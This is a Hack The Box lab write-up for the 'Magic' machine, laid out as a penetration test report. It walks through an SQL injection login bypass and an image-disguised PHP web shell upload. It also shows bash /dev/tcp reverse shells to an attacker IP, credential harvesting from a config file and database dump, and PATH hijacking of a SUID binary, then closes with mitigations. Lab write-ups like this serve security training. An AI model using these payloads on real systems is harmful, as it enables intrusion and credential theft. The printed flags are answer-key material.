# Magic HTB Writeup

## Executive Summary

A comprehensive penetration test of the Magic HTB machine revealed multiple critical vulnerabilities including SQL injection authentication bypass, insecure file upload leading to remote code execution, and privilege escalation through PATH hijacking of a vulnerable SUID binary.

## Reconnaissance

### Network Scanning

**Target Declaration:**
```bash
export target=10.129.49.31
```

<img width="480" height="270" alt="image" src="https://github.com/user-attachments/assets/56ad2019-0b9a-402e-b26f-9c1dcffaabe5" />


**Comprehensive Port Discovery:**
```bash
sudo nmap -p- --min-rate 5000 -sT -vvv $target
```

<img width="877" height="694" alt="image" src="https://github.com/user-attachments/assets/26d4b242-02cc-4a80-b39d-f95e342e268f" />


**Service Enumeration:**
```bash
sudo nmap -p 22,80 -sC -sV -T4 $target
```

<img width="880" height="382" alt="image" src="https://github.com/user-attachments/assets/fd64b176-832c-445a-9bf8-b8a4d0c0b3b6" />


### Findings
- **Port 22**: SSH service
- **Port 80**: HTTP service (Apache)

## Web Application Assessment

### Initial Discovery
Visiting `http://10.129.49.31` revealed a web application with a login portal at `/login.php`.

<img width="963" height="799" alt="image" src="https://github.com/user-attachments/assets/a4cf1d5d-e754-4112-91bd-c9031f6a3c3b" />

<img width="847" height="634" alt="image" src="https://github.com/user-attachments/assets/e3005c16-1b41-4d67-b1d4-60285dd81a40" />


### Authentication Bypass

**SQL Injection Vulnerability:**
- Discovered SQL injection in login form
- Successful bypass using: `admin' OR 1=1-- -`

**Payload Used:**
```
Username: admin
Password: pass' OR 1=1-- -
```

<img width="588" height="604" alt="image" src="https://github.com/user-attachments/assets/50b81658-ec46-468e-aa27-c702c6e935a9" />


### Directory Enumeration

**Gobuster Scan:**
```bash
gobuster dir -u http://$target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50
```

<img width="908" height="438" alt="image" src="https://github.com/user-attachments/assets/9a6fd9ff-3d33-4505-953c-65d6660a517a" />
<img width="993" height="374" alt="image" src="https://github.com/user-attachments/assets/cd0cb7e5-c465-453e-960c-eccc19fe16a2" />

**Key Findings:**
- `/upload.php` - File upload functionality
- `/images/` - Directory containing uploaded files

## Initial Access

### File Upload Vulnerability

<img width="750" height="781" alt="image" src="https://github.com/user-attachments/assets/3a7cf1ee-2f96-445f-a7ee-fe4d36128730" />


**Upload Bypass Technique:**
- Added magic bytes (`PNG`) to PHP shell
- Modified `Content-Type` to `image/png`
- Used double extension: `script.php.png`

<img width="592" height="879" alt="image" src="https://github.com/user-attachments/assets/fbad7112-1fa8-43d3-8a8a-b7f414a2e1eb" />


**PHP Web Shell:**
```php
PNG
<?php system($_GET['cmd']); ?>
```

getting a success message
<img width="745" height="196" alt="image" src="https://github.com/user-attachments/assets/8a1c97f4-8a4f-4663-8a81-c82cc59a28b2" />


### Remote Code Execution

**Command Execution:**
```
http://10.129.49.31/images/uploads/script.php.png?cmd=id
```

<img width="960" height="235" alt="image" src="https://github.com/user-attachments/assets/a9f59cc8-020a-408c-8134-1ff70dc86034" />


**Reverse Shell Payload:**
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.134/9001 0>&1'
```

<img width="960" height="235" alt="image" src="https://github.com/user-attachments/assets/b770fe49-3696-4bf0-8489-12f08c6ab0a6" />


**Shell Obtained:**
- User: `www-data`
- Access Level: Web application context

<img width="768" height="722" alt="image" src="https://github.com/user-attachments/assets/123f6e6b-9ccd-457d-8cda-2690be869174" />


## Post-Exploitation

### Database Credential Discovery

**Location:** `/var/www/Magic/db.php5`

**Credentials Found:**
```php
private static $dbName = 'Magic';
private static $dbHost = 'localhost';
private static $dbUsername = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';
```

<img width="777" height="723" alt="image" src="https://github.com/user-attachments/assets/657b89e8-a787-4818-a95b-7065e57105a9" />


### Database Enumeration

**MySQL Dump:**
```bash
mysqldump -u theseus -p Magic
```

<img width="627" height="76" alt="image" src="https://github.com/user-attachments/assets/a283e37e-a7ad-4468-b9ad-d6fc57e0c215" />

**Additional Credentials Discovered:**
- Username: `admin`
- Password: `Th3s3usW4sK1ng`

<img width="487" height="142" alt="image" src="https://github.com/user-attachments/assets/b61690d9-6149-4b28-94cf-7eecad76b074" />

switch the user to theseus using the password Th3s3usW4sK1ng

<img width="487" height="142" alt="image" src="https://github.com/user-attachments/assets/87ae8982-25c6-4365-986c-a1f270be37c5" />

### User Access

**SSH Access:**
```bash
ssh -i key theseus@10.129.49.31
```

**Note:do a ssh-keygen in your local machine if you dont have a private and public key and then copy the key.pub public key to the ~/.ssh/authorized_keys and ssh into the box using the private key called key with 
ssh -i key theseus@10.129.49.31**

<img width="959" height="161" alt="image" src="https://github.com/user-attachments/assets/ac7a56ad-f3bd-424f-b4d5-9f7a51c4b8a7" />

<img width="946" height="513" alt="image" src="https://github.com/user-attachments/assets/faa74e09-40e3-4c17-8ee4-72bdf203b2a0" />


**User Flag:**
```bash
cat /home/theseus/user.txt
9f6d3eacdb81678cfd6c06d3e82dc76d
```

## Privilege Escalation

### SUID Binary Analysis

**Vulnerable Binary:**
```bash
find / -perm -4000 -type f -user root -ls 2>/dev/null
/bin/sysinfo
```
**Note:try to get setuid binaries owned by root 
find / -perm -4000 -type f -user root -ls 2>/dev/null
we get the /bin/sysinfo which has setuid permission set which is owned by root and in the user group which theseus is a part of**

<img width="967" height="486" alt="image" src="https://github.com/user-attachments/assets/147d2106-2eb8-4be7-9f63-9e0dfbba2382" />


**Binary Analysis:**
```bash
ltrace /bin/sysinfo
```

<img width="498" height="50" alt="image" src="https://github.com/user-attachments/assets/8629459c-ad77-4df6-a864-dd9bfdbf851e" />

<img width="556" height="586" alt="image" src="https://github.com/user-attachments/assets/8ebcf1b4-5bf1-4c39-aa90-abacf689a46b" />

**Vulnerability:** Relative path usage for `fdisk` command

### PATH Hijacking Exploitation

**Malicious fdisk Payload:**
```bash
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.14.134/4444 0>&1"
```

<img width="502" height="181" alt="image" src="https://github.com/user-attachments/assets/8c16145f-d478-4378-b311-e7fe04889d06" />


**Exploitation Steps:**
```bash
# Create payload
echo '#!/bin/bash' > /dev/shm/fdisk
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.134/4444 0>&1"' >> /dev/shm/fdisk
chmod +x /dev/shm/fdisk

# Hijack PATH
export PATH="/dev/shm:$PATH"

# Execute vulnerable binary
/bin/sysinfo
```
### Root Access Achieved

<img width="651" height="701" alt="image" src="https://github.com/user-attachments/assets/c7429087-78fc-44d8-b7d3-1a8005c6d3a8" />

root@ubuntu:~# cat /root/root.txt
cat /root/root.txt
7bcb8be400199d35a96ce942c767a9f1

**Root Flag:**
```bash
cat /root/root.txt
7bcb8be400199d35a96ce942c767a9f1
```

## Vulnerability Analysis

### Critical Security Issues

1. **SQL Injection (Critical)**
   - Unparameterized user input in authentication
   - Complete authentication bypass possible

2. **Insecure File Upload (Critical)**
   - Insufficient file type validation
   - Magic byte and Content-Type manipulation
   - Double extension bypass

3. **Insecure SUID Binary (High)**
   - Relative path usage in privileged binary
   - PATH environment variable hijacking
   - Lack of absolute path specification

4. **Information Disclosure (Medium)**
   - Database credentials in web root
   - Plaintext password storage

## Mitigation Recommendations

### Immediate Actions

1. **Input Validation**
   - Implement parameterized queries
   - Add input sanitization for all user inputs
   - Use prepared statements for database operations

2. **File Upload Security**
   - Implement server-side file type verification
   - Use whitelist approach for allowed extensions
   - Store uploaded files outside web root
   - Scan uploaded files for malicious content

3. **System Hardening**
   - Audit all SUID binaries
   - Use absolute paths in system calls
   - Implement principle of least privilege

### Long-term Improvements

1. **Secure Development**
   - Regular security code reviews
   - Implement security testing in CI/CD pipeline
   - Developer security training

2. **Monitoring & Detection**
   - File integrity monitoring
   - Web application firewall
   - Intrusion detection system

## Technical Indicators

### Attack Timeline
1. Network reconnaissance → 2. Web application enumeration → 3. SQL injection authentication bypass → 4. File upload exploitation → 5. Remote code execution → 6. Database credential discovery → 7. User privilege escalation → 8. SUID binary exploitation → 9. Root compromise

### Tools Utilized
- **Nmap**: Network scanning
- **Gobuster**: Directory enumeration
- **Burp Suite**: Web application testing
- **Netcat**: Reverse shell handling
- **MySQL**: Database interaction

### Exploitation Techniques
- SQL Injection authentication bypass
- File upload filter bypass
- PATH hijacking privilege escalation
- SUID binary exploitation

---

**Penetration Test Report** | **Magic HTB** | **Critical Severity**

---

<style>
body {
    background-color: #000000;
    color: #ffffff;
    font-family: 'Courier New', monospace;
}
</style>
